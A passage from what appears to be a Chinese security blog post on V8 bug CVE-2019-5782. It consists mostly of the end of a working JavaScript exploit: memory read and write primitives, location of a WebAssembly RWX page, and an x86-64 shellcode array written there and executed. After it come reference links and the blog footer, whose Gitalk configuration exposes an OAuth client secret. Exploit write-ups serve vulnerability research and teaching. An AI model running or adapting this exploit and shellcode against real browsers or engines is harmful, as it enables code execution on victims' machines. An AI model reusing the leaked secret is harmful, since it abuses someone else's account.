+<span class="token keyword">var</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">;</span>
+<span class="token keyword">var</span> a3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span><span class="token number">2.2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+a3<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0x11000</span><span class="token punctuation">;</span>
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//%OptimizeFunctionOnNextCall(fun);</span>
+
+<span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//console.log(a2.length);</span>
+<span class="token comment">//%DebugPrint(a1);</span>
+<span class="token comment">//%DebugPrint(a2);</span>
+<span class="token comment">//%SystemBreak();</span>
+
+
+
+<span class="token keyword">var</span> objLeak <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'leak'</span><span class="token operator">:</span> <span class="token number">0x1234</span><span class="token punctuation">,</span> <span class="token string">'tag'</span><span class="token operator">:</span> <span class="token number">0x4567</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> offset_leak <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xffff</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x456700000000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		offset_leak <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
+		<span class="token keyword">break</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'offset_leak = '</span> <span class="token operator">+</span> offset_leak<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	objLeak<span class="token punctuation">.</span>leak <span class="token operator">=</span> obj<span class="token punctuation">;</span>
+	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>offset_leak<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">var</span> objTest <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'aaa'</span><span class="token operator">:</span> <span class="token number">123</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+
+<span class="token comment">//%DebugPrint(objTest);</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'addressOf(objTest) = 0x'</span> <span class="token operator">+</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//%SystemBreak();</span>
+
+
+<span class="token keyword">var</span> buf2write <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0xbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> offset_backing_store <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+<span class="token comment">//%DebugPrint(buf2write);</span>
+<span class="token comment">//%SystemBreak();</span>
+
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xffff</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xbeef</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		offset_backing_store <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+		<span class="token keyword">break</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+
+
+<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	a2<span class="token punctuation">[</span>offset_backing_store<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	a2<span class="token punctuation">[</span>offset_backing_store<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>data_view<span class="token punctuation">.</span><span class="token function">getFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+
+
+<span class="token function">write64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">,</span> <span class="token number">0x2333n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//%DebugPrint(objTest);</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'value = 0x'</span> <span class="token operator">+</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//%SystemBreak();</span>
+
+
+<span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">var</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> f <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>
+
+<span class="token comment">//%DebugPrint(f);</span>
+<span class="token comment">//%SystemBreak();</span>
+
+
+
+<span class="token keyword">var</span> f_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> shared_info_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>f_addr <span class="token operator">+</span> <span class="token number">0x18n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> data_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>shared_info_addr <span class="token operator">+</span> <span class="token number">0x8n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> instance_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>instance_addr <span class="token operator">+</span> <span class="token number">0xe8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token number">0x10101010101b848n</span><span class="token punctuation">,</span>    <span class="token number">0x62792eb848500101n</span><span class="token punctuation">,</span>    <span class="token number">0x431480101626d60n</span><span class="token punctuation">,</span>    <span class="token number">0x2f7273752fb84824n</span><span class="token punctuation">,</span>
+    <span class="token number">0x48e78948506e6962n</span><span class="token punctuation">,</span>    <span class="token number">0x1010101010101b8n</span><span class="token punctuation">,</span>    <span class="token number">0x6d606279b8485001n</span><span class="token punctuation">,</span>    <span class="token number">0x2404314801010162n</span><span class="token punctuation">,</span>
+    <span class="token number">0x1485e086a56f631n</span><span class="token punctuation">,</span>    <span class="token number">0x313b68e6894856e6n</span><span class="token punctuation">,</span>    <span class="token number">0x101012434810101n</span><span class="token punctuation">,</span>    <span class="token number">0x4c50534944b84801n</span><span class="token punctuation">,</span>
+    <span class="token number">0x6a52d231503d5941n</span><span class="token punctuation">,</span>    <span class="token number">0x894852e201485a08n</span><span class="token punctuation">,</span>    <span class="token number">0x50f583b6ae2n</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span>
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0n</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token function">write64</span><span class="token punctuation">(</span>rwx_page_addr <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">,</span> sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://gtoad.github.io/2019/09/01/V8-CVE-2019-5782/">https://gtoad.github.io/2019/09/01/V8-CVE-2019-5782/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/chromium/issues/detail?id=906043">https://bugs.chromium.org/p/chromium/issues/detail?id=906043</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/5712">https://xz.aliyun.com/t/5712</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.sunxiaokong.xyz/2020-02-25/lzx-cve-2019-5782/">https://www.sunxiaokong.xyz/2020-02-25/lzx-cve-2019-5782/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://cy2cs.top/2020/06/24/%E8%BF%91%E6%9C%9F%E5%88%86%E6%9E%90%E7%9A%84%E4%B8%A4%E4%B8%AA-v8-%E6%BC%8F%E6%B4%9E/">https://cy2cs.top/2020/06/24/%E8%BF%91%E6%9C%9F%E5%88%86%E6%9E%90%E7%9A%84%E4%B8%A4%E4%B8%AA-v8-%E6%BC%8F%E6%B4%9E/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04%5E">https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04%5E</a>!</li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04">https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>原作者： </strong>feather
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://www.xi4oyu.top/696ac724/" title="CVE-2019-5782">http://www.xi4oyu.top/696ac724/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/v8/" rel="tag"># v8</a>
+              <a href="/tags/cve/" rel="tag"># cve</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/b941c294/" rel="prev" title="CVE-2021-3156">
+                  <i class="fa fa-chevron-left"></i> CVE-2021-3156
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/5609a6a/" rel="next" title="2021/5/5 随便写写">
+                  2021/5/5 随便写写 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">feather</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">369k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">5:36</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"featherl","repo":"BlogComment","client_id":"675720f495795eee8627","client_secret":"969c2822176976bcb997f7d6fd07767ce6356043","admin_user":"featherl","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"cda532567c21da1001d81f5c16eb94ff"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
